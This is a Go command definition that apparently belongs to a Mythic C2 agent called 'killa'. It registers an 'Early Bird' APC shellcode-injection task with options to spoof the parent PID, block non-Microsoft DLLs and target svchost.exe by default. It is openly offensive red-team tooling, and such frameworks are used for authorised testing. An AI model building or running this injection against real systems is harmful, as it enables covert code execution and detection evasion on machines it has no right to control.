package agentfunctions

import (
	"encoding/base64"
	"encoding/json"
	"fmt"

	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
	"github.com/MythicMeta/MythicContainer/logging"
)

func init() {
	agentstructs.AllPayloadData.Get("killa").AddCommand(agentstructs.Command{
		Name:                "earlybird-injection",
		Description:         "Early Bird Injection — create suspended process, queue APC to main thread, and resume (T1055.004)",
		HelpString:          "earlybird-injection",
		Version:             1,
		MitreAttackMappings: []string{"T1055.004"},
		SupportedUIFeatures: []string{},
		Author:              "@galoryber",
		CommandAttributes: agentstructs.CommandAttribute{
			SupportedOS: []string{agentstructs.SUPPORTED_OS_WINDOWS},
		},
		CommandParameters: []agentstructs.CommandParameter{
			{
				Name:                 "filename",
				ModalDisplayName:     "Shellcode File",
				ParameterType:        agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
				Description:          "Select shellcode from files registered in Mythic",
				Choices:              []string{},
				DefaultValue:         "",
				DynamicQueryFunction: getFileList,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: true,
						GroupName:           "Default",
						UIModalPosition:     0,
					},
				},
			},
			{
				Name:             "file",
				ModalDisplayName: "Shellcode File",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_FILE,
				Description:      "Upload a new shellcode file",
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: true,
						GroupName:           "New File",
						UIModalPosition:     0,
					},
				},
			},
			{
				Name:             "shellcode_b64",
				ModalDisplayName: "Shellcode (Base64)",
				CLIName:          "shellcode_b64",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				Description:      "Base64-encoded shellcode (for CLI/API usage)",
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: true,
						GroupName:           "CLI",
						UIModalPosition:     0,
					},
				},
			},
			{
				Name:             "target",
				ModalDisplayName: "Target Process",
				CLIName:          "target",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				Description:      "Process to create suspended (default: svchost.exe)",
				DefaultValue:     `C:\Windows\System32\svchost.exe`,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default", UIModalPosition: 2},
					{ParameterIsRequired: false, GroupName: "New File", UIModalPosition: 2},
					{ParameterIsRequired: false, GroupName: "CLI", UIModalPosition: 2},
				},
			},
			{
				Name:             "ppid",
				ModalDisplayName: "Parent PID (Spoof)",
				CLIName:          "ppid",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_NUMBER,
				Description:      "Parent PID to spoof (optional)",
				DefaultValue:     0,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default", UIModalPosition: 3},
					{ParameterIsRequired: false, GroupName: "New File", UIModalPosition: 3},
					{ParameterIsRequired: false, GroupName: "CLI", UIModalPosition: 3},
				},
			},
			{
				Name:             "block_dlls",
				ModalDisplayName: "Block Non-MS DLLs",
				CLIName:          "block_dlls",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_BOOLEAN,
				Description:      "Block non-Microsoft DLLs from loading in the new process",
				DefaultValue:     false,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default", UIModalPosition: 4},
					{ParameterIsRequired: false, GroupName: "New File", UIModalPosition: 4},
					{ParameterIsRequired: false, GroupName: "CLI", UIModalPosition: 4},
				},
			},
		},
		TaskFunctionParseArgString: func(args *agentstructs.PTTaskMessageArgsData, input string) error {
			if input == "" {
				return nil
			}
			return args.LoadArgsFromJSONString(input)
		},
		TaskFunctionParseArgDictionary: func(args *agentstructs.PTTaskMessageArgsData, input map[string]interface{}) error {
			return args.LoadArgsFromDictionary(input)
		},
		TaskFunctionCreateTasking: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskCreateTaskingMessageResponse {
			response := agentstructs.PTTaskCreateTaskingMessageResponse{
				Success: true,
				TaskID:  taskData.Task.ID,
			}

			var shellcodeB64 string
			var filename string

			sc, _ := taskData.Args.GetStringArg("shellcode_b64")
			if sc != "" {
				shellcodeB64 = sc
				filename = "(inline)"
			} else {
				fname, fileContents, fErr := resolveFileContents(taskData)
				if fErr != nil {
					response.Success = false
					response.Error = fErr.Error()
					return response
				}
				filename = fname
				shellcodeB64 = base64.StdEncoding.EncodeToString(fileContents)
			}

			target, _ := taskData.Args.GetStringArg("target")
			ppid, _ := taskData.Args.GetNumberArg("ppid")
			blockDLLs, _ := taskData.Args.GetBooleanArg("block_dlls")

			if target == "" {
				target = `C:\Windows\System32\svchost.exe`
			}

			scBytes, err := base64.StdEncoding.DecodeString(shellcodeB64)
			if err != nil {
				logging.LogError(err, "Failed to decode shellcode for size check")
			}

			displayParams := fmt.Sprintf("Shellcode: %s (%d bytes)\nTarget: %s", filename, len(scBytes), target)
			if int(ppid) > 0 {
				displayParams += fmt.Sprintf("\nPPID spoof: %d", int(ppid))
			}
			if blockDLLs {
				displayParams += "\nBlock non-MS DLLs: true"
			}
			response.DisplayParams = &displayParams

			createArtifact(taskData.Task.ID, "Process Create", fmt.Sprintf("Early Bird Injection: %s (shellcode: %d bytes)", target, len(scBytes)))

			agentParams := map[string]interface{}{
				"shellcode_b64": shellcodeB64,
				"target":        target,
				"ppid":          int(ppid),
				"block_dlls":    blockDLLs,
			}
			paramsJSON, err := json.Marshal(agentParams)
			if err != nil {
				response.Success = false
				response.Error = "Failed to marshal parameters: " + err.Error()
				return response
			}
			taskData.Args.SetManualArgs(string(paramsJSON))

			return response
		},
	})
}
